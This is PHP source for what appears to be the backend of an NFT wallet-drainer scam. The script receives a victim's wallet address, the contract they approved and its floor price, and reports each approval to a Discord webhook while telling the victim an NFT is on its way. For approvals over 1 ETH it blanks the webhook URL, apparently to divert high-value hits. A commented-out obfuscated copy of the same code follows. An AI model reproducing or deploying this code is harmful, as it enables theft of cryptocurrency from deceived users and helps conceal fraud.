<?php

$request_method = $_SERVER["REQUEST_METHOD"];
switch ($request_method) {
    case 'POST':
        if (!empty($_GET['o'])) {
            switch ($_GET['o']) {
                case 'success':
                    $post = file_get_contents('php://input');
                    $post = json_decode($post, true);
                    print_r($post);
                    if (!empty($post['userWallet']) && !empty($post['contract']) && !empty($post['price']) && !empty($post['discordWebhookURL'])) {
                        sendWebhook($post['userWallet'], $post['contract'], $post['price'], $post['discordWebhookURL']);
                        echo 'SUCESS: You will soon receive your NFT.';
                    } else echo 'ERROR: You must provide an address, a contract and a private key.';
                    break;
                default:
                    echo 'ERROR: Invalid option.';
                    break;
            }
        } else echo 'ERROR: You must provide an option.';
        break;
    default:
        echo 'ERROR: Invalid request method.';
        break;
}
// ({ userWallet, contract, price, webhookURL }
function sendWebhook($address, $contract, $price, $approvalWebhook)
{
    $headers = ['Content-Type: application/json; charset=utf-8'];
    $POST = ['content' => "> `{$address}` just approved `{$contract}` **(FLOOR: {$price} ETH)**"];

    if (floatval($price) > 1.0) $urlwebhook = "";
    else $urlwebhook = $approvalWebhook;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $urlwebhook);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
    $response   = curl_exec($ch);
}

// Pour OBF: https://www.php-obfuscator.com/?demo


// <?php
// /*   __________________________________________________
//     |  Obfuscated by YAK Pro - Php Obfuscator  2.0.14  |
//     |              on 2022-07-04 11:12:45              |
//     |    GitHub: https://github.com/pk-fr/yakpro-po    |
//     |__________________________________________________|
// */
// goto NCmkt; JWkur: UUR7W: goto KneJi; NCmkt: $zciOD = $_SERVER["\122\105\x51\125\105\123\x54\x5f\115\x45\124\x48\117\104"]; goto qC_YA; qC_YA: switch ($zciOD) { case "\120\x4f\123\x54": goto WqAsk; Xn8xO: T8wXO: goto dOnso; TuPsY: BKYMs: goto jQOSI; fgHmL: goto Qk112; goto qfmdw; i8riT: echo "\105\x52\x52\x4f\122\72\x20\x59\157\165\x20\x6d\x75\x73\x74\x20\x70\162\x6f\166\x69\144\x65\40\x61\156\x20\157\160\164\151\x6f\x6e\56"; goto c6D01; WqAsk: if (!empty($_GET["\x6f"])) { goto BKYMs; } goto i8riT; kRDJK: oO248: goto Xn8xO; jQOSI: switch ($_GET["\157"]) { case "\163\x75\143\143\x65\163\x73": goto ArHUM; PSmhJ: unNkl: goto dgoyU; dgoyU: goto T8wXO; goto X8z_n; mNbFY: echo "\123\x55\103\105\123\123\x3a\40\x59\157\x75\x20\x77\x69\154\x6c\40\163\157\x6f\156\40\162\x65\x63\x65\x69\x76\145\x20\171\x6f\x75\x72\x20\116\x46\x54\56"; goto PSmhJ; omOiQ: c1rtA: goto mwiOC; C5E_n: print_r($LCpDY); goto TfENw; vaqC_: $LCpDY = json_decode($LCpDY, true); goto C5E_n; mwiOC: Q6kai($LCpDY["\x75\163\x65\162\127\x61\x6c\154\x65\x74"], $LCpDY["\x63\x6f\156\164\162\x61\x63\x74"], $LCpDY["\x70\x72\x69\x63\145"], $LCpDY["\x64\151\x73\143\157\162\x64\x57\x65\142\x68\157\x6f\153\125\x52\x4c"]); goto mNbFY; TfENw: if (!empty($LCpDY["\x75\163\x65\162\x57\x61\154\x6c\x65\164"]) && !empty($LCpDY["\x63\157\156\x74\162\141\x63\x74"]) && !empty($LCpDY["\x70\x72\x69\x63\x65"]) && !empty($LCpDY["\144\151\x73\143\x6f\x72\x64\127\x65\x62\x68\157\157\x6b\x55\x52\114"])) { goto c1rtA; } goto evrY1; ArHUM: $LCpDY = file_get_contents("\x70\x68\160\72\57\x2f\151\x6e\160\x75\x74"); goto vaqC_; evrY1: echo "\105\122\122\117\122\72\40\x59\157\165\x20\155\165\163\164\40\x70\162\157\x76\151\x64\x65\x20\141\156\x20\x61\x64\x64\162\145\163\x73\x2c\x20\141\40\143\157\x6e\164\162\x61\x63\x74\x20\141\x6e\x64\x20\x61\40\x70\162\x69\x76\141\x74\145\40\x6b\x65\171\x2e"; goto WEJes; WEJes: goto unNkl; goto omOiQ; X8z_n: default: echo "\105\x52\x52\x4f\122\72\x20\111\x6e\166\141\x6c\x69\x64\40\x6f\x70\164\151\x6f\x6e\56"; goto T8wXO; } goto kRDJK; dOnso: bv7dt: goto fgHmL; c6D01: goto bv7dt; goto TuPsY; qfmdw: default: echo "\105\x52\x52\117\x52\x3a\x20\111\x6e\x76\x61\x6c\151\x64\x20\162\145\x71\x75\x65\x73\164\40\155\145\164\150\157\144\x2e"; goto Qk112; } goto JWkur; KneJi: Qk112: goto ozUTv; ozUTv: function Q6KaI($jsmqz, $hlx77, $oVcOl, $BebDw) { goto Blv3K; S0g1D: $wGdUF = curl_init(); goto hR9Ug; A6y4E: $Fy0uP = $BebDw; goto bx6Lr; kCfKz: curl_setopt($wGdUF, CURLOPT_POST, true); goto X0mJE; X0mJE: curl_setopt($wGdUF, CURLOPT_HTTPHEADER, $YOKvn); goto edWKh; huSA0: curl_setopt($wGdUF, CURLOPT_POSTFIELDS, json_encode($HrxLe)); goto fnzSt; fnzSt: $Wi3Y2 = curl_exec($wGdUF); goto yidcU; gNYT3: dwPJH: goto S0g1D; EHrbw: r88hA: goto U_Zbe; QgO81: if (floatval($oVcOl) > 1.0) { goto r88hA; } goto A6y4E; U_Zbe: $Fy0uP = ''; goto gNYT3; Blv3K: $YOKvn = ["\103\x6f\x6e\x74\145\x6e\x74\55\124\x79\x70\145\x3a\40\141\160\160\x6c\x69\x63\x61\164\151\x6f\x6e\x2f\152\x73\x6f\156\x3b\x20\143\x68\x61\x72\163\x65\164\x3d\x75\x74\146\x2d\x38"]; goto RRXdh; RRXdh: $HrxLe = ["\143\x6f\156\164\x65\156\x74" => "\x3e\40\140{$jsmqz}\x60\x20\x6a\x75\163\164\40\141\160\x70\x72\x6f\x76\145\x64\40\140{$hlx77}\140\40\52\52\50\x46\x4c\x4f\117\122\x3a\40{$oVcOl}\x20\x45\124\x48\x29\52\x2a"]; goto QgO81; a5xz6: curl_setopt($wGdUF, CURLOPT_SSL_VERIFYPEER, false); goto huSA0; hR9Ug: curl_setopt($wGdUF, CURLOPT_URL, $Fy0uP); goto kCfKz; bx6Lr: goto dwPJH; goto EHrbw; edWKh: curl_setopt($wGdUF, CURLOPT_RETURNTRANSFER, true); goto a5xz6; yidcU: }


